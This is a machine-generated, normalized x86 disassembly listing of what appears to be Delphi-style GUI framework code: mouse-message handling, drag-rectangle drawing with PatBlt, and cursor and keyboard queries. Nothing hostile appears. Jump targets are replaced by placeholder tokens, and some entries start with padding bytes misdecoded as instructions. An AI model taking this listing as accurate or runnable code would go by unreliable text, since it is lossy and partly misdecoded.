mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_4471c8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_447214
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44732f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424118
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push r--data
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push r--data
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447336
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_447368
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_4462a8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40346c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40346c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40346c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40346c
jmp r-xdata
sub_447458
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416eec
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_447940
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4466f4
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_446708
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416f3c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_447638
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44627c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40346c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44d054
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_443e78
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_447623
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_44d054
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44d054
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403270
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_446104
test esi esi
je r-xdata
sub_447638
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40346c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_4484bc
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40346c
mov eax esi
call sub_4461ac
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_446168
mov ecx eax
xor edx edx
xor eax eax
call sub_416f14
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40346c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_4476dc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44770c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_447778
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_447838
sub_4477a8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4477d8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_4462a8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_447804
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_447838
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44790c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_447940
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_4479d8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_45e10c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_45e10c
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_446304
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4679b0
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40346c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45e050
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40346c
jmp r-xdata
sub_447b6c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_4088ec
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408918
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_446304
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408744
call sub_4086b4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_4086b4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_447c14
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_447c44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_447c08
push ebp
call sub_447c14
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447c94
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_447d20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_447d58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4477d8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dfc0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40346c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dfc0
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40346c
sub_447ddc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4462d4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44699c
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_447d58
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_447e28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4462d4
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_447e44
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_4462d4
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44699c
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_447d58
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40346c
sub_447e9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_447778
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44770c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_447778
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_447f38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_447d58
pop esi
pop ebx
retn
sub_447f5d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_447d58
pop esi
pop ebx
retn
sub_447f83
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_447d58
pop esi
pop ebx
retn
sub_447fad
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_447d58
pop esi
pop ebx
retn
sub_447fd8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_448008
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_4477d8
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dfc0
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40346c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dfc0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40346c
sub_448080
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_4480b8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45dfc0
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40346c
sub_4480f0
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44699c
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4480b8
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406bf8
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40346c
sub_448168
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_4480b8
pop esi
pop ebx
retn
sub_448188
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_4480b8
pop esi
pop ebx
retn
sub_4481a8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45dfc0
